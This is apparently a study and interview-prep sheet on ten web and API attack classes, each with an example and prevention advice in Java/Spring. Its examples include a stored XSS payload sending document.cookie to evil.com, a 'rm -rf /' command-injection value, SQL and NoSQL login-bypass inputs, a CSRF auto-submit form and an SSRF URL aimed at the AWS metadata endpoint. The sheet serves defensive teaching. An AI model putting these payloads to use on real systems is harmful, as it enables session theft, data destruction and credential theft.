================================================================
COMMON ATTACK VECTORS — Web Applications & APIs
================================================================

OVERVIEW
---------
Understanding attacks is essential for building secure systems.
Each attack below includes: What it is, How it works, Prevention.

================================================================
1. INJECTION ATTACKS
================================================================

SQL INJECTION
--------------
Attack: Attacker inserts malicious SQL into an input field.

Example:
  URL: /users?id=1 OR 1=1 --
  Query becomes: SELECT * FROM users WHERE id=1 OR 1=1 --
  → Returns all users

Variants:
  - Classic SQLi   : return extra data
  - Blind SQLi     : true/false inference (no visible output)
  - Time-based     : SLEEP() to confirm vulnerability
  - Error-based    : error messages reveal schema

Prevention:
  ✓ Use Prepared Statements / Parameterized Queries (ALWAYS)
  ✓ Use ORM (Hibernate, JPA) — parameterized by default
  ✓ Input validation and whitelisting
  ✓ Principle of least privilege on DB accounts
  ✗ Do NOT rely on input sanitization alone

// VULNERABLE:
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// SAFE (Prepared Statement):
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);

// SAFE (Spring JPA):
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

----------------------------------------------------------------

NOSQL INJECTION
----------------
Targets MongoDB, Cassandra, etc.
Example (MongoDB):
  { "username": { "$gt": "" }, "password": { "$gt": "" } }
  → Bypasses login (always true)

Prevention: Use typed models, validate input shape, avoid $where.

----------------------------------------------------------------

COMMAND INJECTION
------------------
Attacker injects OS commands.
Example: input = "test; rm -rf /"
  Runtime.exec("ping " + input) → runs rm -rf /

Prevention:
  ✓ Avoid Runtime.exec() with user input
  ✓ Use safe libraries with argument arrays
  ✓ Whitelist allowed input values

2. CROSS-SITE SCRIPTING (XSS)
================================================================

WHAT:
  Attacker injects malicious JavaScript into a web page, which runs
  in other users' browsers.

TYPES:
  Reflected XSS  : Script in URL, reflected back in response
  Stored XSS     : Script stored in DB, served to all visitors (DANGEROUS)
  DOM-based XSS  : JavaScript manipulates DOM unsafely client-side

IMPACT:
  - Steal session cookies → account takeover
  - Keyloggers, phishing overlays
  - CSRF attacks

EXAMPLE (Stored XSS):
  Comment field: <script>fetch('https://evil.com?c='+document.cookie)</script>
  → All users viewing the comment trigger the attack

PREVENTION:
  ✓ Encode/escape ALL output (HTML entities: < > & " ')
  ✓ Use Content Security Policy (CSP) headers
  ✓ HttpOnly cookies (prevents JavaScript cookie access)
  ✓ Modern frameworks (React, Angular) escape by default
  ✓ DOMPurify for sanitizing HTML input
  ✗ Never use innerHTML with user data

Content-Security-Policy: default-src 'self'; script-src 'self'

================================================================
3. CROSS-SITE REQUEST FORGERY (CSRF)
================================================================

WHAT:
  Tricks an authenticated user's browser into making unwanted requests
  to a site where they're already logged in.

HOW:
  User is logged into bank.com (session cookie auto-sent).
  User visits evil.com which has:
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker"/>
      <input name="amount" value="10000"/>
    </form>
    <script>document.forms[0].submit()</script>
  Browser sends the request WITH the bank session cookie → transfer happens!

PREVENTION:
  ✓ CSRF Tokens (synchronizer token pattern)
  ✓ SameSite=Strict or SameSite=Lax cookie attribute
  ✓ Double Submit Cookie pattern
  ✓ Check Origin/Referer headers
  ✓ For APIs: CSRF often not needed if using stateless JWT (no cookies)

Spring Security CSRF (enabled by default for browser apps):
  http.csrf(csrf -> csrf
      .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
  );

For REST APIs with JWT (disable CSRF):
  http.csrf(AbstractHttpConfigurer::disable);

================================================================
4. MAN-IN-THE-MIDDLE (MITM)
================================================================

WHAT:
  Attacker intercepts communication between client and server.

HOW:
  - ARP spoofing on local network
  - Rogue Wi-Fi hotspots
  - DNS spoofing
  - SSL Stripping (downgrade HTTPS → HTTP)

PREVENTION:
  ✓ HTTPS with valid certificates (TLS 1.2+)
  ✓ HSTS (prevents SSL stripping)
  ✓ Certificate pinning (for mobile)
  ✓ DNSSEC

================================================================
5. BROKEN AUTHENTICATION
================================================================

ATTACKS:
  - Brute force: try all passwords
  - Credential stuffing: use leaked username/password pairs
  - Session fixation: force user to use known session ID
  - Session hijacking: steal session cookie

PREVENTION:
  ✓ Rate limiting & account lockout
  ✓ MFA (defeats credential stuffing)
  ✓ Secure password hashing: BCrypt, Argon2, PBKDF2
  ✓ Secure session management (rotate session ID on login)
  ✓ HttpOnly + Secure cookie flags
  ✓ Short token expiry + refresh tokens

// Password hashing in Spring Security:
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // cost factor 12
}

================================================================
6. INSECURE DIRECT OBJECT REFERENCES (IDOR)
================================================================

WHAT:
  User accesses resources they shouldn't by guessing/modifying an ID.

EXAMPLE:
  GET /api/invoices/1001 → user's invoice
  User changes to: GET /api/invoices/1002 → another user's invoice!

PREVENTION:
  ✓ Always check: does the authenticated user OWN this resource?
  ✓ Use UUIDs instead of sequential IDs (harder to guess)
  ✓ Authorization checks in service layer, not just UI

@PreAuthorize("#invoice.userId == authentication.name")
public Invoice getInvoice(Invoice invoice) { ... }

================================================================
7. SENSITIVE DATA EXPOSURE
================================================================

ATTACKS:
  - Unencrypted passwords in DB (plain text)
  - Tokens/keys in logs, URLs, version control
  - HTTP (not HTTPS) in production
  - Weak hashing (MD5/SHA1) for passwords

PREVENTION:
  ✓ Hash passwords with bcrypt/argon2 (NEVER store plain text)
  ✓ Encrypt sensitive fields at rest
  ✓ Never log sensitive data (tokens, passwords, PII)
  ✓ Use secrets management (Vault, AWS Secrets Manager)
  ✓ Scan git history for leaked secrets (.gitignore, git-secrets)

================================================================
8. SECURITY MISCONFIGURATION
================================================================

EXAMPLES:
  - Default admin credentials (admin/admin)
  - Debug endpoints exposed in production (/actuator without auth)
  - Stack traces exposed to users
  - Unnecessary HTTP methods enabled (TRACE, PUT on public endpoints)
  - Permissive CORS (Access-Control-Allow-Origin: *)
  - Open S3 buckets

PREVENTION:
  ✓ Disable unused features, endpoints, ports
  ✓ Environment-specific configs (no debug in prod)
  ✓ Secure Spring Actuator endpoints
  ✓ Principle of least privilege for all configs

# Secure actuator (Spring Boot)
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=when-authorized

================================================================
9. JWT ATTACKS
================================================================

ALGORITHM CONFUSION (alg:none)
  Attacker changes header: {"alg":"none"} → removes signature
  Server accepts unsigned token if it trusts the header's alg claim.
  Prevention: Never allow alg:none; hardcode expected algorithm.

RS256 → HS256 CONFUSION
  If server uses RS256, attacker sets alg to HS256 and signs with
  the server's PUBLIC key (which is known).
  Prevention: Always specify and enforce the expected algorithm.

JWT SECRET BRUTE FORCE
  Weak HS256 secrets can be brute-forced offline with tools like hashcat.
  Prevention: Use 256-bit random secrets or asymmetric keys.

================================================================
10. SERVER-SIDE REQUEST FORGERY (SSRF)
================================================================

WHAT:
  Attacker tricks server into making HTTP requests to internal/
  unintended destinations.

EXAMPLE:
  /api/fetch?url=http://169.254.169.254/latest/meta-data/
  → Reads AWS EC2 metadata (credentials!)

PREVENTION:
  ✓ Whitelist allowed URLs/domains
  ✓ Block private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x)
  ✓ Disable unnecessary outbound connections
  ✓ Use cloud IMDSv2 (requires session token for AWS metadata)

================================================================
COMMON INTERVIEW QUESTIONS
================================================================

Q: How do you prevent SQL injection?
A: Use parameterized queries / prepared statements. Never concatenate
   user input into SQL strings. ORMs like Hibernate use parameterized
   queries by default.

Q: What is the difference between XSS and CSRF?
A: XSS: Attacker injects JavaScript that runs in victims' browsers.
   CSRF: Attacker tricks victim's browser into making unwanted requests
   using the victim's existing authenticated session.

Q: Why is bcrypt better than MD5 for password hashing?
A: MD5 is a fast hash — billions of hashes/sec with GPUs. Bcrypt has a
   configurable cost factor that makes it intentionally slow, making
   brute-force/rainbow table attacks impractical.

Q: What is IDOR? How do you prevent it?
A: Insecure Direct Object Reference — accessing resources by manipulating
   IDs without authorization checks. Prevention: always verify the
   authenticated user is authorized to access the specific resource.

Q: How does SSRF work? Real-world example?
A: Server is tricked into making requests on behalf of the attacker.
   Capital One breach (2019): attacker used SSRF to access AWS metadata
   endpoint and steal credentials, exposing 100M+ records.
